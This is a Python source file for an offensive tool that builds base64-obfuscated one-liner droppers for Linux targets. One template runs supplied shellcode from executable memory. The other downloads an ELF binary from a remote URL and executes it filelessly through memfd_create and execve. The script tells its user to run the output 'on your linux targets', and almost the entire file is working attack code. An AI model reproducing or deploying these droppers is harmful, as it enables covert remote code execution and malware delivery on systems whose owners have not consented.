#!/usr/bin/env python3

'''
generate a one liner for python based shellcode delivery
'''

# pylint: disable=invalid-name, broad-except

import atexit
import base64
import readline
import sys

sc_loader_template = '''
import ctypes
import sys
from ctypes.util import find_library
PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
MAP_PRIVATE = 0X02
MAP_ANONYMOUS = 0X20
ENOMEM = -1
SHELLCODE = "{var_0}"
libc = ctypes.CDLL(find_library('c'))
mmap = libc.mmap
mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                 ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
mmap.restype = ctypes.c_void_p
page_size = ctypes.pythonapi.getpagesize()
sc_size = len(SHELLCODE)
mem_size = page_size * (1 + sc_size/page_size)
cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE |
            PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
            -1, 0)

if cptr == ENOMEM:
    sys.exit("mmap")

if sc_size <= mem_size:
    ctypes.memmove(cptr, SHELLCODE, sc_size)
    sc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
    call_sc = ctypes.cast(cptr, sc)
    call_sc(None)
'''

memfd_exec_loader_template = '''
import ctypes
import urllib2
from ctypes.util import find_library

d = urllib2.urlopen('{var_0}').read()
count = len(d)
# memfd_create
syscall = ctypes.CDLL(None).syscall
syscall.restype = ctypes.c_int
syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
fd = syscall(319, '', 0)
# write
syscall.restype = ctypes.c_ssize_t
syscall.argtypes = [ctypes.c_long, ctypes.c_int,
                    ctypes.c_void_p, ctypes.c_size_t]
res = syscall(1, fd, d, count)
# execve
syscall.restype = ctypes.c_int
syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.POINTER(
    ctypes.c_char_p), ctypes.POINTER(ctypes.c_char_p)]
str_arr = ctypes.c_char_p * 2
argv = str_arr()
argv[:] = [{var_1}]
res = syscall(59, "/proc/self/fd/"+str(fd), argv, None)
'''


class Dropper:
    '''
    Generate a shell command dropper using one of the python2 templates
    '''

    def __init__(self, dropper):
        self.dropper = dropper
        self.args = []
        self.select_dropper()

        if self.args is None and '{var_0}' in self.dropper:
            print("no args given, the dropper won't work")
        i = 0
        for var in self.args:
            self.dropper = self.dropper.replace('{var_'+str(i)+'}', var)
            i += 1

    def select_dropper(self):
        '''

        return the template
        '''
        if self.dropper == "shellcode":
            self.dropper = sc_loader_template
            self.config_shellcode_loader()
        elif self.dropper == "memfd_exec":
            self.dropper = memfd_exec_loader_template
            self.config_memfd_exec()

    def config_shellcode_loader(self):
        '''
        shellcode loader code
        '''
        shellcode = input(
            "[?] shellcode hex string (eg. \\x00\\x01): ").strip()
        self.args.append(shellcode)

    def config_memfd_exec(self):
        '''
        memfd_exec code
        '''
        url = input("[?] URL to your ELF binary: ").strip()
        self.args.append(url)
        argv = input(
            "[?] argv array to run your ELF (eg. 'ls', '-lah', '/tmp'): ").strip()
        self.args.append(argv)

    def gen_cmd(self):
        '''
        generate the cmd for dropping
        '''
        payload = base64.b64encode(self.dropper.encode("utf-8"))
        print(
            f'''echo "exec('{payload.decode('utf-8')}'.decode('base64'))"|python''')

        print("\n\nRun this one liner on your linux targets")


# usage
try:
    dropper_selection = sys.argv[1]
except IndexError:
    print(f"{sys.argv[0]} <shellcode/memfd_exec>")
    sys.exit(1)


def save(prev_h_len, hfile):
    '''
    append to histfile
    '''
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, hfile)


# support GNU readline interface, command history
histfile = "/tmp/.dropper_gen_history"
try:
    readline.read_history_file(histfile)
    h_len = readline.get_current_history_length()
except FileNotFoundError:
    open(histfile, 'wb').close()
    h_len = 0
atexit.register(save, h_len, histfile)

try:
    # run
    dropper_gen = Dropper(dropper_selection)
    dropper_gen.gen_cmd()
except KeyboardInterrupt:
    sys.exit(0)
